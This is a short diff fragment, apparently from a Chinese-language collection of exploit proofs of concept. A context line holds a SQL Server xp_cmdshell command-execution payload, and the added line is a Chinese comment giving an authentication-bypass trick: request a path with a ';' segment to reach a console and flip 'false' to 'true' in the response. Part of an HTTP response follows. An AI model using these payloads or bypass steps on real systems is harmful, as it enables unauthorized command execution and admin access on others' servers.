@@ -4610,6 +4610,7 @@ exec master..xp_cmdshell 'whoami';
 ### POC
 
 ```
+# 访问地址：/fs/;/console，然后把响应包中的false改成true即可绕过。
 HTTP/1.1 200 OK
 Server: Apache-Coyote/1.1
 Date: Thu, 10 Aug 2023 20:38:25 GMT
